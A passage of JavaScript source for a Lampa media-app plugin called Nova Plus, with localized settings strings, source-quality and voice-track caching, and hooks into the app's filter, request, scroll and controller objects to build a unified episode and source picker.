(function () {
  'use strict';

  if (window.nova_plus) return;
  window.nova_plus = true;

  var ENABLED_KEY = 'nova_plus_enabled';
  var MODE_KEY = 'nova_plus_mode';
  var JUMP_FROM = 20;
  var SEEN_PERCENT = 90;
  var LOGO_DARK = 0.4;
  var LOGO_DARK_SHARE = 0.45;
  var LOGO_VISIBLE = 0.55;
  var LOGO_BRIGHT_SHARE = 0.12;
  var LOGO_TONE_KEY = 'nova_plus_logo_tone2';
  var LOGO_MEM = {};
  var LOGO_CACHE_KEY = 'nova_plus_logo_cache2';
  var LOGO_RETRY = 6 * 60 * 60 * 1000;
  var LEAVE_GRACE = 2500;
  var LOGO_WARM = {};
  var LOGO_BLIND = {};

  var filters = [];
  var scrolls = [];

  function get(key, def) {
    try { return Lampa.Storage.get(key, def); } catch (e) { return def; }
  }

  function cached(key, size, def) {
    var out;
    try { out = Lampa.Storage.cache(key, size, def); } catch (e) { out = null; }
    if (!out || typeof out !== 'object') {
      out = def;
      try { Lampa.Storage.set(key, def); } catch (e) {}
    }
    return out;
  }

  function save(key, value) {
    try { Lampa.Storage.set(key, value); } catch (e) {}
  }

  function enabled() { return get(ENABLED_KEY, true) !== false; }
  function novaMode() { return get(MODE_KEY, 'wide') === 'skin' ? 'skin' : 'wide'; }
  function modeWide() { return novaMode() === 'wide'; }
  function lockedOn(line) { return modeWide() ? line + ' · ' + label('nova_plus_locked_on') : line; }
  function lockedOff(line) { return modeWide() ? line + ' · ' + label('nova_plus_locked_off') : line; }
  function heroEnabled() { return modeWide() ? true : get('nova_plus_hero', true) !== false; }
  function artEnabled() { return modeWide() ? true : get('nova_plus_hero_art', true) !== false; }
  function viewMode() { return get('nova_plus_view', 'list'); }
  function preferredQuality() { return get('nova_plus_quality', 'auto'); }

  function focusRing() { return get('nova_plus_focus_style', 'ring') !== 'fill'; }

  function fullScreen() { return modeWide() ? true : get('nova_plus_fullscreen', true) === true; }

  function applyFullScreen() {
    try {
      var body = $('body');
      if (fullScreen()) body.addClass('nova-plus-full');
      else body.removeClass('nova-plus-full');
    } catch (e) {}
  }

  function edgeFade() { return get('nova_plus_fade', false) === true; }

  function applyEdgeFade() {
    try {
      var body = $('body');
      if (edgeFade()) body.addClass('nova-plus-fade');
      else body.removeClass('nova-plus-fade');
    } catch (e) {}
  }

  function applyFocusStyle() {
    try {
      var body = $('body');
      if (focusRing()) body.addClass('nova-plus-focus-ring');
      else body.removeClass('nova-plus-focus-ring');
    } catch (e) {}
  }

  var OWN = {
    nova_plus_set_mode: { ru: 'Вид карточки', uk: 'Вигляд картки', en: 'Card layout' },
    nova_plus_set_mode_descr: { ru: 'Широкий: две колонки, серии и файлы карточками. Классический: шапка, тулбар и список', uk: 'Широкий: дві колонки, серії та файли картками. Класичний: шапка, тулбар і список', en: 'Wide: two columns, episodes and files as cards. Classic: header, toolbar and list' },
    nova_plus_mode_wide: { ru: 'Широкий', uk: 'Широкий', en: 'Wide' },
    nova_plus_mode_skin: { ru: 'Классический', uk: 'Класичний', en: 'Classic' },
    nova_plus_locked_on: { ru: 'в широком виде всегда включено', uk: 'у широкому вигляді завжди увімкнено', en: 'always on in the wide layout' },
    nova_plus_locked_off: { ru: 'в широком виде не используется', uk: 'у широкому вигляді не використовується', en: 'not used in the wide layout' },
    nova_plus_watch: { ru: 'Смотреть', uk: 'Дивитися', en: 'Watch' },
    nova_plus_continue: { ru: 'Продолжить', uk: 'Продовжити', en: 'Continue' },
    nova_plus_from_start: { ru: 'Смотреть с начала', uk: 'Дивитися з початку', en: 'Watch from start' },
    nova_plus_next_episode: { ru: 'Следующая', uk: 'Наступна', en: 'Next' },
    nova_plus_first_new: { ru: 'Первая непросмотренная', uk: 'Перша непроглянута', en: 'First unwatched' },
    nova_plus_source: { ru: 'Источник', uk: 'Джерело', en: 'Source' },
    nova_plus_season: { ru: 'Сезон', uk: 'Сезон', en: 'Season' },
    nova_plus_voice: { ru: 'Перевод', uk: 'Переклад', en: 'Audio' },
    nova_plus_jump: { ru: 'Серии', uk: 'Серії', en: 'Episodes' },
    nova_plus_jump_pick: { ru: 'Выбрать серию', uk: 'Вибрати серію', en: 'Pick an episode' },
    nova_plus_files: { ru: 'Файлы', uk: 'Файли', en: 'Files' },
    nova_plus_playlist: { ru: 'Плейлист', uk: 'Плейлист', en: 'Playlist' },
    nova_plus_files_pick: { ru: 'Выбрать файл', uk: 'Вибрати файл', en: 'Pick a file' },
    nova_plus_view: { ru: 'Вид', uk: 'Вигляд', en: 'View' },
    nova_plus_view_list: { ru: 'Список', uk: 'Список', en: 'List' },
    nova_plus_view_grid: { ru: 'Плитка', uk: 'Плитка', en: 'Grid' },
    nova_plus_clarify: { ru: 'Уточнить поиск', uk: 'Уточнити пошук', en: 'Refine search' },
    nova_plus_more_sources: { ru: 'Ещё {count}', uk: 'Ще {count}', en: '{count} more' },
    nova_plus_season_progress: { ru: 'Просмотрено {seen} из {total}', uk: 'Переглянуто {seen} з {total}', en: 'Watched {seen} of {total}' },
    nova_plus_season_left: { ru: 'осталось {left}', uk: 'залишилось {left}', en: '{left} left' },
    nova_plus_season_planned: { ru: 'всего в сезоне {planned}', uk: 'усього в сезоні {planned}', en: '{planned} in the season' },
    nova_plus_left: { ru: 'осталось', uk: 'залишилось', en: 'left' },
    nova_plus_loading_title: { ru: 'Ищем, где посмотреть', uk: 'Шукаємо, де подивитися', en: 'Looking for a source' },
    nova_plus_loading_start: { ru: 'Опрашиваем источники', uk: 'Опитуємо джерела', en: 'Checking sources' },
    nova_plus_sec: { ru: ' с', uk: ' с', en: ' s' },
    nova_plus_episode: { ru: 'Серия', uk: 'Серія', en: 'Episode' },
    nova_plus_action: { ru: 'Действие', uk: 'Дія', en: 'Action' },
    nova_plus_unknown: { ru: 'Неизвестно', uk: 'Невідомо', en: 'Unknown' },
    nova_plus_voice_dub: { ru: 'Дубляж', uk: 'Дубляж', en: 'Dubbed' },
    nova_plus_voice_mvo: { ru: 'Многоголосый', uk: 'Багатоголосий', en: 'Multi-voice' },
    nova_plus_voice_dvo: { ru: 'Двухголосый', uk: 'Двоголосий', en: 'Two-voice' },
    nova_plus_voice_avo: { ru: 'Авторский', uk: 'Авторський', en: 'Single-voice' },
    nova_plus_voice_orig: { ru: 'Оригинал', uk: 'Оригінал', en: 'Original' },
    nova_plus_voice_sub: { ru: 'Субтитры', uk: 'Субтитри', en: 'Subtitles' },
    nova_plus_voice_other: { ru: 'Другое', uk: 'Інше', en: 'Other' },
    nova_plus_try_source: { ru: 'Попробовать {name}', uk: 'Спробувати {name}', en: 'Try {name}' },
    nova_plus_all_sources: { ru: 'Все источники', uk: 'Всі джерела', en: 'All sources' },
    nova_plus_retry: { ru: 'Повторить', uk: 'Повторити', en: 'Retry' },
    nova_plus_auto_next: { ru: 'Через {sec} сек переключимся на «{name}»', uk: 'Через {sec} с перейдемо на «{name}»', en: 'Switching to "{name}" in {sec}s' },
    nova_plus_dead_all: { ru: 'Ни один источник ничего не нашёл', uk: 'Жодне джерело нічого не знайшло', en: 'No source found anything' },
    nova_plus_set_enable: { ru: 'Включить Nova Plus', uk: 'Увімкнути Nova Plus', en: 'Enable Nova Plus' },
    nova_plus_set_enable_descr: { ru: 'Единый интерфейс для всех онлайн-плагинов', uk: 'Єдиний інтерфейс для всіх онлайн-плагінів', en: 'One interface for every online plugin' },
    nova_plus_set_hero: { ru: 'Шапка с кнопкой', uk: 'Шапка з кнопкою', en: 'Header with button' },
    nova_plus_set_hero_descr: { ru: 'Кадр, прогресс и кнопка продолжения сверху', uk: 'Кадр, прогрес і кнопка продовження вгорі', en: 'Backdrop, progress and continue button on top' },
    nova_plus_set_hero_art: { ru: 'Кадр в шапке', uk: 'Кадр у шапці', en: 'Backdrop in header' },
    nova_plus_set_hero_art_descr: { ru: 'Выключите для компактной шапки без картинки', uk: 'Вимкніть для компактної шапки без картинки', en: 'Turn off for a compact header without artwork' },
    nova_plus_set_logo: { ru: 'Логотип вместо названия', uk: 'Логотип замість назви', en: 'Logo instead of title' },
    nova_plus_set_art_size: { ru: 'Качество кадра', uk: 'Якість кадру', en: 'Backdrop quality' },
    nova_plus_set_art_size_descr: { ru: 'Разрешение картинки в шапке. Выше — резче, но тяжелее', uk: 'Роздільна здатність картинки в шапці. Вище — різкіше, але важче', en: 'Header artwork resolution. Higher is sharper but heavier' },
    nova_plus_art_auto: { ru: 'Авто (по экрану)', uk: 'Авто (за екраном)', en: 'Auto (by screen)' },
    nova_plus_art_780: { ru: 'Обычное — 780px', uk: 'Звичайна — 780px', en: 'Normal — 780px' },
    nova_plus_art_1280: { ru: 'Высокое — 1280px', uk: 'Висока — 1280px', en: 'High — 1280px' },
    nova_plus_art_orig: { ru: 'Максимальное (тяжёлое)', uk: 'Максимальна (важка)', en: 'Maximum (heavy)' },
    nova_plus_set_logo_descr: { ru: 'Показывать логотип фильма в шапке, если он есть', uk: 'Показувати логотип фільму в шапці, якщо він є', en: 'Show the movie logo in the header when available' },
    nova_plus_set_full: { ru: 'Во всю ширину экрана', uk: 'На всю ширину екрана', en: 'Full width' },
    nova_plus_set_full_descr: { ru: 'Скрыть маленький постер и описание слева', uk: 'Сховати маленький постер і опис ліворуч', en: 'Hide the small poster and overview on the left' },
    nova_plus_set_fade: { ru: 'Размытые края постера', uk: 'Розмиті краї постера', en: 'Faded poster edges' },
    nova_plus_set_fade_descr: { ru: 'Растворять постер вверху по краям со всех сторон', uk: 'Розчиняти постер угорі по краях з усіх боків', en: 'Fade the header artwork out on every side' },
    nova_plus_set_probe: { ru: 'Проверять источники в фоне', uk: 'Перевіряти джерела у фоні', en: 'Check sources in background' },
    nova_plus_set_probe_descr: { ru: 'Отмечать рабочие точкой и показывать их качество', uk: 'Позначати робочі точкою та показувати їхню якість', en: 'Mark working ones with a dot and show their quality' },
    nova_plus_set_probe_ext: { ru: 'Источники проверяет сам онлайн-плагин, повторный обход не нужен', uk: 'Джерела перевіряє сам онлайн-плагін, повторний обхід не потрібен', en: 'The online plugin checks sources itself, no second pass needed' },
    nova_plus_set_switch: { ru: 'Автопереход по источникам', uk: 'Автоперехід по джерелах', en: 'Auto switch source' },
    nova_plus_set_switch_descr: { ru: 'Если ничего не найдено, пробовать следующий рабочий источник', uk: 'Якщо нічого не знайдено, пробувати наступне робоче джерело', en: 'Try the next working source when nothing is found' },
    nova_plus_set_view: { ru: 'Вид списка', uk: 'Вигляд списку', en: 'List layout' },
    nova_plus_set_view_descr: { ru: 'Список или плитка (4 в ряд)', uk: 'Список або плитка (4 в ряд)', en: 'List or grid (4 per row)' },
    nova_plus_set_quality: { ru: 'Качество по умолчанию', uk: 'Якість за замовчуванням', en: 'Default quality' },
    nova_plus_set_quality_descr: { ru: 'Предпочтительное качество воспроизведения', uk: 'Бажана якість відтворення', en: 'Preferred playback quality' },
    nova_plus_set_quality_auto: { ru: 'Авто', uk: 'Авто', en: 'Auto' },
    nova_plus_set_focus: { ru: 'Выделение', uk: 'Виділення', en: 'Highlight style' },
    nova_plus_set_focus_descr: { ru: 'Чем подсвечивать выбранную кнопку, серию или озвучку', uk: 'Чим підсвічувати вибрану кнопку, серію або озвучення', en: 'How the focused button, episode or voice is highlighted' },
    nova_plus_set_focus_ring: { ru: 'Ободок', uk: 'Обідок', en: 'Outline' },
    nova_plus_set_focus_fill: { ru: 'Белая заливка', uk: 'Біла заливка', en: 'White fill' }
  };

  try {
    Lampa.Lang.add(OWN);
  } catch (e) {}

  function tr(key) {
    try {
      var value = Lampa.Lang.translate(key);
      if (value && value !== key) return value;
    } catch (e) {}
    return '';
  }

  function text(key, own) {
    return tr(key) || tr(own) || (OWN[own] ? OWN[own].ru : '');
  }

  function label(key) {
    return tr(key) || (OWN[key] ? OWN[key].ru : '');
  }

  var ICON = {
    play: '<svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor"><path d="M8 5v14l11-7z"></path></svg>',
    chevron: '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2.6"><path d="M6 9l6 6 6-6" stroke-linecap="round" stroke-linejoin="round"></path></svg>',
    search: '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="11" cy="11" r="7"></circle><path d="M20 20l-4-4" stroke-linecap="round"></path></svg>',
    refresh: '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M20 11a8 8 0 10-2.3 5.7" stroke-linecap="round"></path><path d="M20 4v7h-7" stroke-linecap="round" stroke-linejoin="round"></path></svg>',
    grid: '<svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor"><rect x="3" y="3" width="8" height="8" rx="1.6"></rect><rect x="13" y="3" width="8" height="8" rx="1.6"></rect><rect x="3" y="13" width="8" height="8" rx="1.6"></rect><rect x="13" y="13" width="8" height="8" rx="1.6"></rect></svg>',
    list: '<svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor"><rect x="3" y="4" width="18" height="4" rx="1.4"></rect><rect x="3" y="10" width="18" height="4" rx="1.4"></rect><rect x="3" y="16" width="18" height="4" rx="1.4"></rect></svg>',
    eye: '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z" stroke-linecap="round" stroke-linejoin="round"></path><circle cx="12" cy="12" r="2.6"></circle></svg>'
  };

  function esc(value) {
    return (value === undefined || value === null ? '' : String(value))
      .replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function digits(value) {
    var found = ('' + (value === undefined || value === null ? '' : value)).match(/\d+/);
    return found ? parseInt(found[0], 10) : 0;
  }

  var TMDB_PATH = /^\/[A-Za-z0-9._-]+\.(jpg|jpeg|png|webp|svg)$/i;

  function hostPath(path) {
    var origin = '';
    try { origin = String(window.location.origin || ''); } catch (e) { origin = ''; }
    if (!/^https?:/i.test(origin)) return path;
    return origin + path;
  }

  function image(path, size) {
    if (!path || path === 'undefined') return '';
    path = String(path);
    if (/^https?:/i.test(path)) return path;
    if (path.indexOf('//') === 0) {
      var proto = 'https:';
      try { proto = window.location.protocol === 'http:' ? 'http:' : 'https:'; } catch (e) {}
      return proto + path;
    }
    if (!TMDB_PATH.test(path)) return path.charAt(0) === '/' ? hostPath(path) : '';
    try { return Lampa.TMDB.image('t/p/' + (size || 'w780') + path); } catch (e) { return ''; }
  }

  function episodeNumber(value) {
    var num = parseInt(value, 10);
    if (!num && num !== 0) return String(value === undefined || value === null ? '' : value);
    return num < 10 ? '0' + num : String(num);
  }

  function shortQuality(value) {
    if (!value) return '';
    value = String(value);
    var match = value.match(/(2160|1440|1080|720|576|480|360)\s*p?/i);
    if (match) {
      var num = parseInt(match[1], 10);
      if (num >= 2160) return '4K';
      if (num >= 1080) return 'FHD';
      if (num >= 720) return 'HD';
      return 'SD';
    }
    if (/4k|uhd/i.test(value)) return '4K';
    if (/fhd/i.test(value)) return 'FHD';
    if (/\bhd\b/i.test(value)) return 'HD';
    return '';
  }

  var QUALITY_RANK = { '4K': 4, FHD: 3, HD: 2, SD: 1 };
  var PROBE_TTL_OK = 21600000;
  var PROBE_TTL_EMPTY = 1800000;

  var QUALITY_TTL = 604800000;

  function qualityBox() {
    var all = cached('nova_source_quality', 500, {});
    var key;

    for (key in all) {
      if (typeof all[key] === 'string') {
        all = {};
        save('nova_source_quality', all);
        break;
      }
    }

    var now = Date.now();
    for (key in all) {
      var entry = all[key];
      if (!entry || typeof entry !== 'object' || !entry.list ||
          now - (entry.t || 0) > QUALITY_TTL) delete all[key];
    }
    return all;
  }

  function qualityScope() {
    return movie && movie.id ? String(movie.id) : '';
  }

  function knownQuality(name) {
    var id = qualityScope();
    if (!id || !name) return '';
    var mine = qualityBox()[id];
    return (mine && mine.list && mine.list[name]) || '';
  }

  function rememberQuality(name, label) {
    var id = qualityScope();
    if (!id || !name || !label) return;
    var all = qualityBox();
    var mine = all[id];
    if (!mine || typeof mine !== 'object' || !mine.list) mine = { t: 0, list: {} };
    if ((QUALITY_RANK[label] || 0) <= (QUALITY_RANK[mine.list[name]] || 0)) return;
    mine.list[name] = label;
    mine.t = Date.now();
    all[id] = mine;
    save('nova_source_quality', all);
  }

  function probeCache(id) {
    var all = cached('nova_probe', 2000, {});
    var mine = all[id];
    if (!mine || typeof mine !== 'object' || !mine.list) {
      mine = { time: Date.now(), list: {} };
      all[id] = mine;
    }
    var list = mine.list || {};
    var now = Date.now();
    for (var key in list) {
      var entry = list[key] || {};
      var stamp = entry.t || mine.time || 0;
      var ttl = entry.s === 'ok' ? PROBE_TTL_OK : PROBE_TTL_EMPTY;
      if (now - stamp > ttl) delete list[key];
    }
    mine.list = list;
    return mine;
  }

  var probe_saves = 0;

  function probeSave(id, name, state, count) {
    if (!id || !name) return;
    probe_saves++;
    var all = cached('nova_probe', 2000, {});
    var mine = probeCache(id);
    mine.list[name] = { s: state, c: count || 0, t: Date.now() };
    all[id] = mine;
    save('nova_probe', all);
  }

  var VOICE_TTL = 12 * 60 * 60 * 1000;

  function voiceBook(id) {
    var all = cached('nova_voices2', 2000, {});
    var mine = all[id];
    if (!mine || typeof mine !== 'object' || !mine.list) {
      mine = { time: Date.now(), list: {} };
      all[id] = mine;
    }
    var list = mine.list || {};
    var now = Date.now();
    for (var key in list) {
      var entry = list[key] || {};
      if (now - (entry.t || mine.time || 0) > VOICE_TTL) delete list[key];
    }
    mine.list = list;
    return mine;
  }

  function voiceKey(name) {
    var clean = String(name == null ? '' : name).trim().toLowerCase();
    if (!clean) return '';
    var component = '';
    try { component = Lampa.Activity.active().component || ''; } catch (e) {}
    return component + '|' + (currentSourceKey() || '') + '|' + (seasonNumber() || 0) + '|' + clean;
  }

  function voiceSave(name, count) {
    if (!movie || !count) return;
    var key = voiceKey(name);
    if (!key) return;
    var all = cached('nova_voices2', 2000, {});
    var mine = voiceBook(movie.id);
    count = parseInt(count, 10) || 0;
    mine.list[key] = { c: count, t: Date.now() };
    all[movie.id] = mine;
    save('nova_voices2', all);
  }

  function voiceMetadata(item) {
    if (!item || typeof item.episode_count !== 'number' || !isFinite(item.episode_count) || item.episode_count < 0) return null;
    return Math.floor(item.episode_count);
  }

  function voiceCount(name) {
    var list = groups.voice && groups.voice.items || [];
    for (var i = 0; i < list.length; i++) {
      if (list[i].title === name && voiceMetadata(list[i]) !== null) return voiceMetadata(list[i]);
    }
    if (!movie) return 0;
    var key = voiceKey(name);
    if (!key) return 0;
    var entry = voiceBook(movie.id).list[key];
    return (entry && entry.c) || 0;
  }

  function splitSourceName(name) {
    name = String(name || '');
    var badge = '';
    var match = name.match(/\s*[-~–]\s*(2160p?|1440p?|1080p?|720p?|480p?|4k|uhd|fhd|hd)\b[^,]*$/i);
    if (match) {
      badge = shortQuality(match[1]);
      if (badge) name = name.slice(0, match.index);
    }
    return { name: name.replace(/\s+$/, ''), badge: badge };
  }

  var VOICE_KINDS = [
    { key: 'dub', own: 'nova_plus_voice_dub', title: 'nova_voice_dub', re: /дубляж|дублирован|\bdub\b|\bdubbing\b/i },
    { key: 'mvo', own: 'nova_plus_voice_mvo', title: 'nova_voice_mvo', re: /многоголос|\bmvo\b|\bpmvo\b/i },
    { key: 'dvo', own: 'nova_plus_voice_dvo', title: 'nova_voice_dvo', re: /двухголос|\bdvo\b/i },
    { key: 'avo', own: 'nova_plus_voice_avo', title: 'nova_voice_avo', re: /авторск|одноголос|\bavo\b|\bvo\b/i },
    { key: 'orig', own: 'nova_plus_voice_orig', title: 'nova_voice_orig', re: /оригинал|original|\beng\b|\bua\b|\bukr\b/i },
    { key: 'sub', own: 'nova_plus_voice_sub', title: 'nova_voice_sub', re: /субтитр|sub(title)?s?\b/i }
  ];

  var VOICE_STUDIOS = [
    { key: 'mvo', re: /lostfilm|лостфильм|tvshows|dniprofilm|невафильм|newstudio|newcomers|baibako|байбако|alexfilm|jaskier|coldfilm|колдфильм|hdrezka|rezkastudio|red head sound|sunshine|amedia|zakadry|закадры|linefilm|le-production|1win|kerob|profix|selena|октопус/i },
    { key: 'dvo', re: /кубик в кубе|kubik|viruseproject|вирус|green ?tea|paradox/i },
    { key: 'avo', re: /яроцк|гаврилов|володарск|сербин|горчаков|михал[её]в|живов|пучков|гоблин|кураж|дольск|есарев|карповск|визгунов/i }
  ];

  function voiceKind(title) {
    var value = String(title || '');
    var i;
    for (i = 0; i < VOICE_KINDS.length; i++) {
      if (VOICE_KINDS[i].re.test(value)) return VOICE_KINDS[i].key;
    }
    for (i = 0; i < VOICE_STUDIOS.length; i++) {
      if (VOICE_STUDIOS[i].re.test(value)) return VOICE_STUDIOS[i].key;
    }
    return 'other';
  }

  function voiceRank(title) {
    var kind = voiceKind(title);
    for (var i = 0; i < VOICE_KINDS.length; i++) {
      if (VOICE_KINDS[i].key === kind) return i;
    }
    return 90;
  }

  function pageSize(total) {
    return total > 200 ? 50 : total > 80 ? 20 : 10;
  }

  function pages(total) {
    var size = pageSize(total);
    var out = [];
    for (var start = 0; start < total; start += size) {
      out.push({ start: start, end: Math.min(start + size, total) - 1 });
    }
    if (out.length > 1) {
      var tail = out[out.length - 1];
      if (tail.end - tail.start + 1 <= size / 2) {
        out[out.length - 2].end = tail.end;
        out.pop();
      }
    }
    return out;
  }

  function pageAt(list, index) {
    for (var i = 0; i < list.length; i++) {
      if (index >= list[i].start && index <= list[i].end) return list[i];
    }
    return list[0] || { start: 0, end: -1 };
  }

  function addCSS() {
    if (document.getElementById('nova-plus-css')) return;
    var style = document.createElement('style');
    style.id = 'nova-plus-css';
    style.textContent = SKIN_CSS + EXTRA_CSS + CARD_CSS + FOCUS_CSS + FULL_CSS + FADE_CSS + MARK_CSS + BADGE_CSS + LOGO_CSS + LOGO_HOLD + WIDE_CSS;
    (document.body || document.head).appendChild(style);
  }

  function hookFilter() {
    if (!Lampa.Filter || Lampa.Filter.nova_plus_wrapped) return;
    var real = Lampa.Filter;

    function Wrapped(params) {
      var inst = new real(params);
      var setter = inst.set;
      inst.nova_sets = {};
      inst.set = function (type, list) {
        inst.nova_sets[type] = list;
        return setter.apply(inst, arguments);
      };
      filters.unshift(inst);
      if (filters.length > 4) filters.pop();
      return inst;
    }

    Wrapped.nova_plus_wrapped = true;
    for (var key in real) Wrapped[key] = real[key];
    Lampa.Filter = Wrapped;
  }

  function hookSelect() {
    if (!Lampa.Select || Lampa.Select.nova_plus_wrapped) return;
    var show = Lampa.Select.show;
    var hide = Lampa.Select.hide;
    var close = Lampa.Select.close;
    var opened = false;

    Lampa.Select.show = function (params) {
      if (capturing && params && params.items && params.items.length) {
        captured = params;
        return;
      }
      opened = true;
      return show.apply(Lampa.Select, arguments);
    };

    if (typeof hide === 'function') {
      Lampa.Select.hide = function () {
        opened = false;
        try {
          return hide.apply(Lampa.Select, arguments);
        } catch (e) {}
      };
    }

    if (typeof close === 'function') {
      Lampa.Select.close = function () {
        if (!opened) return;
        opened = false;
        try {
          return close.apply(Lampa.Select, arguments);
        } catch (e) {}
      };
    }

    try {
      Lampa.Select.listener.follow('hide', function () {
        opened = false;
      });
    } catch (e) {}

    Lampa.Select.nova_plus_wrapped = true;
  }

  function learnUrl(url) {
    var value = String(url == null ? '' : url);
    if (!/\/lite\/[^\/?&]+/.test(value)) return;
    if (value.indexOf('lite/events') !== -1) return;
    probe_url = value;
  }

  function voiceParse(body) {
    var out = [];
    try {
      $('<div>' + body + '</div>').find('.videos__button').each(function () {
        var node = $(this);
        var name = String(node.text() || '').trim();
        if (!name) return;
        var link = '';
        try {
          var data = JSON.parse(node.attr('data-json') || '{}');
          if (data) {
            var candidates = [data.url, data.href, data.link, data.request, data.api, data.source_url, data.voice_url];
            if (Array.isArray(data.urls)) candidates = candidates.concat(data.urls);
            if (data.data && typeof data.data === 'object') candidates.push(data.data.url, data.data.href, data.data.link);
            for (var ci = 0; ci < candidates.length; ci++) {
              if (typeof candidates[ci] === 'string' && candidates[ci]) { link = candidates[ci]; break; }
            }
          }
        } catch (e) {
          link = '';
        }
        if (!link) {
          link = node.attr('data-url') || node.attr('href') || '';
        }
        out.push({ name: name, url: link ? String(link) : '', active: node.hasClass('active') });
      });
    } catch (e) {
      return [];
    }
    return out;
  }

  function learnBody(body, origin, season) {
    if (typeof body !== 'string') return;
    if (body.indexOf('videos__button') === -1) return;
    var list = voiceParse(body);
    if (list.length < 2) return;
    var mark = body.match(/\ss="(\d+)"/);
    var found = mark ? (parseInt(mark[1], 10) || 0) : 0;
    if (typeof season === 'number' && season) found = season;
    var merged = [];
    var oldList = voice_seen && voice_seen.list || [];
    oldList.concat(list).forEach(function (entry) {
      var key = voiceNorm(entry.name);
      if (!key) return;
      var existing = merged.find(function (item) { return voiceNorm(item.name) === key; });
      if (!existing) merged.push({ name: entry.name, url: entry.url || '', active: !!entry.active });
      else {
        if (!existing.url && entry.url) existing.url = entry.url;
        existing.active = existing.active || !!entry.active;
      }
    });
    voice_seen = {
      id: movie ? movie.id : 0,
      season: found || (voice_seen && voice_seen.season) || 0,
      origin: origin || (voice_seen && voice_seen.origin) || probe_url,
      list: merged
    };
    if (voiceWanted()) {
      clearTimeout(voice_retry_timer);
      voice_retry_timer = setTimeout(function () {
        if (!inSkin() || !voiceWanted()) return;
        voiceRun();
        voicePaint();
      }, 80);
    }
  }

  function hookRequest() {
    if (!Lampa.Reguest || Lampa.Reguest.nova_plus_wrapped) return;
    var real = Lampa.Reguest;

    function Wrapped() {
      var inst = new real();
      ['native', 'silent', 'timeout', 'clear'].forEach(function (name) {
        if (typeof inst[name] !== 'function') return;
        if (name === 'timeout' || name === 'clear') return;
        var origin = inst[name];
        inst[name] = function (url) {
          if (inst.nova_probe) return origin.apply(inst, arguments);
          try { learnUrl(url); } catch (e) {}
          var args = arguments;
          try {
            if (typeof args[1] === 'function') {
              args = Array.prototype.slice.call(arguments);
              var real_ok = args[1];
              args[1] = function (answer) {
                try { learnBody(answer, url); } catch (e) {}
                return real_ok.apply(this, arguments);
              };
            }
          } catch (e) {
            args = arguments;
          }
          return origin.apply(inst, args);
        };
      });
      return inst;
    }

    Wrapped.nova_plus_wrapped = true;
    for (var key in real) Wrapped[key] = real[key];
    Wrapped.prototype = real.prototype;
    Lampa.Reguest = Wrapped;
  }

  function hookXHR() {
    try {
      if (!window.XMLHttpRequest || XMLHttpRequest.prototype.nova_plus_wrapped) return;
      var open = XMLHttpRequest.prototype.open;
      if (typeof open !== 'function') return;
      XMLHttpRequest.prototype.open = function (method, url) {
        try { learnUrl(url); } catch (e) {}
        return open.apply(this, arguments);
      };
      XMLHttpRequest.prototype.nova_plus_wrapped = true;
    } catch (e) {}
  }

  function hookScroll() {
    if (!Lampa.Scroll || Lampa.Scroll.nova_plus_wrapped) return;
    var real = Lampa.Scroll;

    function Wrapped(params) {
      var inst = new real(params);
      scrolls.unshift(inst);
      if (scrolls.length > 6) scrolls.pop();
      return inst;
    }

    Wrapped.nova_plus_wrapped = true;
    for (var key in real) Wrapped[key] = real[key];
    Lampa.Scroll = Wrapped;
  }

  function voiceLeft() {
    if (!ui.rows || !ui_focus || ui_focus.indexOf('voice:') !== 0) return false;
    var current = ui.rows.find('[data-nova-focus="' + ui_focus + '"]').first()[0];
    if (!current) return false;
    var cr = current.getBoundingClientRect();
    var best = null;
    var bestX = -Infinity;
    ui.rows.find('[data-nova-focus^="voice:"]').each(function () {
      if (this === current) return;
      var r = this.getBoundingClientRect();
      var sameRow = Math.abs((r.top + r.height / 2) - (cr.top + cr.height / 2)) <= Math.max(8, Math.min(r.height, cr.height) * 0.6);
      if (sameRow && r.right <= cr.left + 2 && r.right > bestX) {
        best = this;
        bestX = r.right;
      }
    });
    if (best) return focusNode(best, true);
    var poster = ui.play && ui.play.length ? ui.play[0] : (ui.next && ui.next.length ? ui.next[0] : null);
    if (poster) return focusNode(poster, true);
    return false;
  }

  function itemLeft() {
    if (!ui.rows || !ui_focus || ui_focus.indexOf('item:') !== 0) return false;
    var current = ui.rows.find('[data-nova-focus="' + ui_focus + '"]').first()[0];
    if (!current) return false;
    var cr = current.getBoundingClientRect();
    var best = null;
    var bestX = -Infinity;
    ui.rows.find('[data-nova-focus^="item:"]').each(function () {
      if (this === current) return;
      var r = this.getBoundingClientRect();
      var sameRow = Math.abs((r.top + r.height / 2) - (cr.top + cr.height / 2)) <= Math.max(10, Math.min(r.height, cr.height) * 0.65);
      if (sameRow && r.right <= cr.left + 2 && r.right > bestX) {
        best = this;
        bestX = r.right;
      }
    });
    if (best) return focusNode(best, true);
    return 'delegate';
  }

  function hookController() {
    if (!Lampa.Controller || Lampa.Controller.nova_plus_wrapped) return;
    var add = Lampa.Controller.add;

    Lampa.Controller.add = function (name, object) {
      if (name === 'content' && object && !object.nova_plus_hooked) {
        object.nova_plus_hooked = true;

        if (typeof object.up === 'function') {
          var up = object.up;
          object.up = function () {
            pressMark();
            if (novaUp()) return;
            return up.apply(this, arguments);
          };
        }
        if (typeof object.down === 'function') {
          var down = object.down;
          object.down = function () {
            pressMark();
            if (novaDown()) return;
            return down.apply(this, arguments);
          };
        }
        if (typeof object.right === 'function') {
          var right = object.right;
          object.right = function () {
            pressMark();
            if (novaRight()) return;
            return right.apply(this, arguments);
          };
        }
        if (typeof object.left === 'function') {
          var left = object.left;
          object.left = function () {
            pressMark();
            if (voiceLeft()) return;
            var itemMove = itemLeft();
            if (itemMove === 'delegate') return left.apply(this, arguments);
            if (itemMove) return;
            if (novaLeft()) return;
            return left.apply(this, arguments);
          };
        }
        if (typeof object.toggle === 'function') {
          var toggle = object.toggle;
          object.toggle = function () {
            var frozen = (lockActive() || ui_open) ? scrollFreeze() : null;
